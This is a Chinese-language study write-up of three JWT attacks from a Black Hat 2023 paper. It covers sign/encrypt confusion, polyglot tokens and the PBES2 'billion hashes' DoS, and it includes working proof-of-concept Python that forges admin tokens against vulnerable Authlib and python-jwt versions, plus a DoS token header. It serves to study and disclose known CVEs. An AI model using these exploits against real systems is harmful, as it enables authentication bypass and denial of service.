# 三种针对JSON Web Tokens的新攻击方式

> **来源**: https://forum.butian.net/share/2877  
> **文章ID**: 2877

---

Three New Attacks Against JSON Web Tokens
=========================================

Introduction
------------

本文是笔者阅读BLACK HAT-2023中《Three New Attacks Against JSON Web Tokens》这篇paper学习后所写的笔记，涉及到相关的原理知识、3种新的JWT攻击姿势和复现过程。

Theory
------

JWT大家已经非常熟悉了，但是有一些概念上的区别可能大伙不是很了解：

1. JWTs：JSON Web Tokens
2. JWS：Signed JWT。签名过的jwt
3. JWE：Encrypted JWT。部分payload经过加密的jwt；目前加密payload的操作不是很普及；
4. JWK：JWT的密钥，也就是我们常说的 secret；
5. JWKset：JWT key set。在非对称加密中，需要的是密钥对而非单独的密钥
6. JWA：当前JWT所用到的密码学算法；
7. nonsecure JWT：当头部的签名算法被设定为none的时候，该JWT是不安全的；因为签名的部分空缺，所有人都可以修改。

JWE是一个很新的概念，JWS是去验证数据的，而JWE（JSON Web Encryption）是保护数据不被第三方的人看到的。通过JWE，JWT变得更加安全。

JWE和JWS的公钥私钥方案不相同，JWS中，私钥持有者加密令牌，公钥持有者验证令牌。而JWE中，私钥一方应该是唯一可以解密令牌的一方。

在JWE中，公钥持有可以将新的数据放入JWT中，但是JWS中，公钥持有者只能验证数据，不能引入新的数据。因此，对于公钥/私钥的方案而言，JWS和JWE是互补的。

JWE有五部分组成：

- The protected header，类似于JWS的头部；
- The encrypted key，用于加密密文和其他加密数据的对称密钥；
- The initialization vector，初始IV值，有些加密方式需要额外的或者随机的数据；
- The encrypted data (cipher text)，密文数据；
- The authentication tag，由算法产生的附加数据，来防止密文被篡改。

格式类似于JWT，只不过有个`.`：

```php
eyJhbGciOiJSU0ExXzUiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2In0.
UGhIOguC7IuEvf_NPVaXsGMoLOmwvc1GyqlIKOK1nN94nHPoltGRhWhw7Zx0-kFm1NJn8LE9XShH59_i8J0PH5ZZyNfGy2xGdULU7sHNF6Gp2vPLgNZ__deLKxGHZ7PcHALUzoOegEI-8E66jX2E4zyJKxYxzZIItRzC5hlRirb6Y5Cl_p-ko3YvkkysZIFNPccxRU7qve1WYPxqbb2Yw8kZqa2rMWI5ng8OtvzlV7elprCbuPhcCdZ6XDP0_F8rkXds2vE4X-ncOIM8hAYHHi29NX0mcKiRaD0-D-ljQTPcFPgwCp6X-nZZd9OHBv-B3oWh2TbqmScqXMR4gp_A.
AxY8DCtDaGlsbGljb3RoZQ.
KDlTtXchhZTGufMYmOYGS4HffxPSUrfmqCHXaI9wOGY.
9hH0vgRfYgPnAHOd8stkvw 
```

加密过程如下（读者可以自己查找相关文章）：

1. 根据头部alg的声明，生成一定大小的随机数；
2. 根据密钥管理模式确定加密密钥；
3. 根据密钥管理模式确定JWE加密密钥，得到CEK；
4. 计算初始IV，如果不需要，跳过此步骤；
5. 如果ZIP头申明了，则压缩明文；
6. 使用CEK，IV和附加认证数据，通过enc头声明的算法来加密内容，结果为加密数据和认证标记；
7. 压缩内容，返回token。

```php
base64(header) + '.' +base64(encryptedKey) + '.' + // Steps 2 and 3 base64(initializationVector) + '.' + // Step 4 base64(ciphertext) + '.' + // Step 6 base64(authenticationTag) // Step 6 
```

Sign/encrypt confusion
----------------------

漏洞产生的原因是用非对称加密算法生成JWE对象时，是用公钥来加密，私钥来解密，这导致了任何拥有公钥的人都可以任意发行合法的JWE。RFC并没有规定JWE的生成不允许使用非对称加密算法，这就导致了对密码学不熟悉的开发者可能会使用非对称加密算法生成JWE导致漏洞的出现。此外，下面的情况可能会导致即使开发者并不使用JWE，但仍然会受到这样的攻击：

1. 他们正在使用一个库，这个库接受JWS或JWE包装的JWTs。RFC明确允许这样做，它描述了一种自动区分两种类型JWT的方法。
2. 该库接受用公钥加密的JWE JWTs。
3. 开发者正在发布使用私钥/公钥对签名的非对称令牌。
4. 第三步的私钥/公钥对被提供给验证程序。
5. 开发者没有强制执行特定的验证算法，且该库默认情况下不要求这样做。

在这种情况下，攻击者可以做的是使用用于签名的相同公钥来加密一个令牌（即生成JWE）。存在漏洞的库随后会用私钥解密这个 JWE 对象，并认为它是真实的，即使开发人员本来并不打算使用JWE。

这种攻击需要攻击者首先确定正在使用中的公钥。然而公钥并不需要保密，很容易获得，它通常被发布在某处，例如OpenID Connect 端点中。即使公钥没有发布，在使用了某些算法（包括非常常见的 RS256、RS384 和 RS512 选项）的情况下可以从2个不同的签名中获得公钥。利用脚本是[SecuraBV/jws2pubkey: jws2pubkey tool](https://github.com/SecuraBV/jws2pubkey)。

首先安装存在漏洞的库：

```php

python -m pip install Authlib==1.0.1
```

在burpsuite上利用jwt editor插件生成一个JWK，放入`rsa-key.jwk`中。

![image-20240327204322907.png](images/attach-d9abcdd2ec2049a1d91acac8b303a046f0ba6424.png)

并且导出一个`rsa_public_key.pem`，作为公钥。

下面的代码是验证代码，都可以从库的文档中找到使用例子 [JSON Web Encryption (JWE) - Authlib 1.3.0 documentation](https://docs.authlib.org/en/latest/jose/jwe.html)：

```python
from authlib.jose import jwt, JsonWebKey,JsonWebEncryption
import sys, json
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as PKCS1_cipher
import base64
def validate(token):
    claims = jwt.decode(token, key)
    print(claims)
    claims.validate()
def get_key(key_file):
    with open(key_file) as f:
        data = f.read()
        key = RSA.importKey(data)
    return key

with open('rsa-key.jwk', 'r') as keyfile:
    key = JsonWebKey.import_key(json.load(keyfile))

header = {
    'alg':'RS256'
}
payload = {
    "username":"feng"
}

token1 = jwt.encode(header,payload,key)
print(token1)
print()

##############################
jwe = JsonWebEncryption()
protected = {'alg': 'RSA-OAEP','enc':'A256GCM'}
payload = {
    'username':"admin"
}
with open('rsa_public_key.pem', 'rb') as f:
    evilKey = f.read()

token2 = jwe.serialize_compact(protected, json.dumps(payload), key)
print(token2)

validate(token2)
```

第一个jwt的生成利用了私钥，而第二个token2实际上是用公钥生成的JWE，authlib会用私钥解密这个JWE并获取其中的payload，并且`validate`函数也验证这个JWT是有效的，实现了伪造。

![image-20240327204502284.png](images/attach-163516d4391397b21c6b44a0bc1356b072470273.png)

影响的库（包括但不限于）：

- Authlib before version 1.1.0 (CVE-2022-39174)
- WCrypto before version 1.4 (CVE-2022-3102)
- JWX before version 0.12.0

Polyglot token
--------------

Polyglot token攻击实际上是由多个JWT解析器的不一致导致的。

漏洞产生的原因是JWS可以使用三种不同语法表示：紧凑序列化、通用JSON序列化和扁平化JSON序列化。JWT RFC规定**只应该使用紧凑序列化（即AAA.BBB.CCC的形式）**。然而，许多JWT库出于一些原因将他们的token传递给一个通用的JWS库，并且那个JWS库可能支持更多形式的JWS，这种解析上的差异导致了漏洞的存在，具体看一下例子就可以理解。

![image-20240328134240237.png](images/attach-38c5dcd66dfb4a8ecc4a5c603c153e3dfa6b24ad.png)

在`python-jwt`库中，解析JWT是按照`.`来分割：

![image-20240328134407730.png](images/attach-4c21159d095f0cd5d1199f23b4346e05d9612c41.png)

然后使用了`jwcrypto`库的`deserialize`函数反序列化一个 JWS token，实际上就是在这一步中对jwt反序列并进行验证。然而，`jwcrypto`库支持JSON序列化的格式，在不是JSON的情况下才考虑紧凑序列化

![image-20240328135218015.png](images/attach-662f1fafbc43500e24caa376fcdc59b8d79f8a90.png)

这种解析上的差异导致了漏洞，例如程序生成了`AAAA.BBBB.CCCC`的JWT，我们可以使用这样的JWT进行攻击：

```php
{  
  "AAAA":".evilPayload.",  
  "protected":"AAAA",  
  "payload":"BBBB",  
  "signature":"CCCC"  
}
```

对于`python-jwt`，他解析到的header是`{ "AAAA":"`，payload是`evilPayload`（python-jwt不验证签名，签名是由`jwcrypto`验证）。在解析header的时候，因为用的是`base64url_decode`所以会去掉其他的字符，只剩下AAAA，也就是正常的一个jwt header。jwcrypto验证签名的时候，会忽略掉`AAAA`这个键名只考虑`protected`、`payload`、`signature`，从而可以正确验证通过。

验证通过后，后续`python-jwt`使用的payload是我们的`evilPayload`，因此利用这种解析的差异实现了JWT伪造。

具体验证需要安装`python_jwt==3.3.3`：

```php

python -m pip install python_jwt==3.3.3
```

代码：

```python
import base64

import python_jwt as jwt, jwcrypto.jwk as jwk, datetime
import json
key = jwk.JWK.generate(kty='RSA', size=2048)

priv_pem = key.export_to_pem(private_key=True, password=None)

pub_pem = key.export_to_pem()

payload = { 'username': 'feng'};
priv_key = jwk.JWK.from_pem(priv_pem)

pub_key = jwk.JWK.from_pem(pub_pem)

token = jwt.generate_jwt(payload, priv_key, 'RS256', datetime.timedelta(minutes=60))
splitToken = token.split(".")
header, claims = jwt.verify_jwt(token, pub_key, ['RS256'])
print(token)
print(header)
print(claims)

claims['username'] = 'admin'
base64Payload = base64.b64encode(json.dumps(claims).encode()).decode('utf-8')

evilToken = '{{   "{}":".{}.","protected":"{}","payload":"{}","signature":"{}"}}'.format(splitToken[0],base64Payload,splitToken[0],splitToken[1],splitToken[2])
print("\n\n"+evilToken)
header, claims = jwt.verify_jwt(evilToken, pub_key, ['RS256'])
print(header)
print(claims)

```

具体`evilToken`的构造上因为需要让base64的字节数是4的倍数，因此需要填充对应数量的非base64即可（空格）。此外，在实际构造上我发现`evilToken`最好不要带换行，带有换行符可能会造成`binascii`的错误。

从运行结果也可以看出，成功的伪造了JWT并且验证通过：

![image-20240328140735345.png](images/attach-7b69822fec4a62199482fd1cbf2d1ef4c4847a9a.png)

影响的库（包括但不限于）：

- python-jwt before version 3.3.4 (CVE-2022-39227)

Billion hashes attack
---------------------

Billion hashes attack是一种DOS攻击。产生的原因是JWE的加密标准中支持PBES2算法。PBES2算法是基于密码的加密算法，这个密码是人为选择的，为了防止离线字典攻击和暴力破解，PBES2算法加上了一个迭代次数的参数，该参数定义了需要执行多少次连续的加密哈希操作才能将一个密码转换成一个加密的密钥。迭代次数越高，函数变得越慢。

在JWE中，迭代次数是在token header中的p2c定义，攻击者可以将 p2c 设置为一个很高的值导致服务器端执行太多次跌倒导致拒绝服务器攻击。此外，虽然修改p2c会让token验证不通过，但是对于服务端来说，验证token需要先生成PBES2算法的密钥，即先对初始密码和盐进行指定次数的迭代，因此虽然token验证不通过，但是已经实施了攻击。

具体攻击上例如创建这么一个header：

```php
{  
    "alg": "PBES2-HS512+A256KW",  
    "p2s": "8Q1SzinasR3xchYz6ZZcHA",  
    "p2c": 2147483647,  
    "enc": "A128CBC-HS256"  
}
```

p2c设置为有符号 32 位整数的最大值，然后本地生成一个**JWE**，发送给服务器上即可造成DOS。

攻击要求：

1. JWT库默认支持JWE封装的JWTs和PBES算法。
2. JWT库没有使用单独的API进行基于密码的加密，而是以相同方式处理加密密钥和密码。
3. 库用户没有为JWT验证配置特定允许的算法。

影响的库（包括但不限于）：

- jose before versions 1.28.1, 2.0.5, 3.20.3 or 4.9.1 (CVE-2022-36083)
- jose-jwt before version 4.1

References
----------

[mkjwk - JSON Web Key Generator](https://mkjwk.org/)

[SecuraBV/jws2pubkey: jws2pubkey tool](https://github.com/SecuraBV/jws2pubkey)

[JSON Web Encryption (JWE) - Authlib 1.3.0 documentation](https://docs.authlib.org/en/latest/jose/jwe.html)

[JWT、JWE、JWS 、JWK 到底是什么？该用 JWT 还是 JWS？-51CTO.COM](https://www.51cto.com/article/630971.html)

[davedoesdev/python-jwt: Python module for generating and verifying JSON Web Tokens](https://github.com/davedoesdev/python-jwt)
